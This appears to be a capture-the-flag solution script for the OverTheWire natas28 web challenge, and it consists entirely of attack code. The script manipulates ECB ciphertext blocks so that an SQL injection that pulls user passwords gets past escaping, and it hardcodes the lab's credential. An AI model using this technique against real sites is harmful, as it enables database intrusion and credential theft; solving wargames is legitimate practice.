import requests
from urllib.parse import unquote, quote_from_bytes
import base64

headers = {"Authorization": "Basic bmF0YXMyODoxSk53UU0xT2k2SjZqMWs0OVh5dzdaTjZwWE1RSW5Wag=="}
def get_encrypted(text):
    data = {"query": text}
    text = requests.post("http://natas28.natas.labs.overthewire.org/index.php", data=data, headers=headers)
    query = text.url.split('=')[1]
    query = unquote(query)
    query = base64.decodebytes(query.encode())
    return query

harmless_first_block = get_encrypted(b"a" * 10)[32:48]
want = b"a" * 9 + b"\'" + b" UNION SELECT password FROM users;#"
enc = get_encrypted(want)
enc = list(enc)
enc[32:48] = list(harmless_first_block)
enc = b''.join(map(int.to_bytes, enc))
url = (quote_from_bytes(base64.encodebytes(enc)[:-1]))
print(f"http://natas28.natas.labs.overthewire.org/search.php?query={url}")
